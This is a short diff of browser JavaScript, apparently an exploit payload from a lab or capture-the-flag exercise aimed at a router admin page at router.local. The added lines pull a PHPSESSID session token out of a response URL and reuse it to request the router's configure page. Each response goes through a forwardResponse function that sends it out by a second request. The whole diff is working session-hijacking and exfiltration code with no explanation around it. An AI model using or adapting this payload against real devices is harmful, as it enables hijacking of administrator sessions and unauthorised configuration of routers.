@@ -14,13 +14,27 @@ function forwardResponse(req) {
 	fwdxhr.send(data);
 }
 
-//forwardResponse("foo");
-
 let xhr = new XMLHttpRequest();
 
 xhr.onreadystatechange = function() {
 	if (xhr.readyState === 4) {
+		// TODO: extract PHPSESSID from query params using URLSearchParams, then make a get to http://router.local/home.php?action=configure&PHPSESSID=...
 		forwardResponse(xhr);
+
+		const queryString = xhr.responseURL.split('?')[1];
+		let queryParams = new URLSearchParams(queryString);
+		const sessionId = queryParams.get("PHPSESSID");
+
+		let xhr2 = new XMLHttpRequest();
+
+		xhr2.onreadystatechange = function() {
+			if (xhr2.readyState === 4) {
+				forwardResponse(xhr2);
+			}
+		}
+
+		xhr2.open("GET", ROUTER + "/home.php?action=configure&PHPSESSID=" + sessionId, true);
+		xhr2.send('');
 	}
 }
 
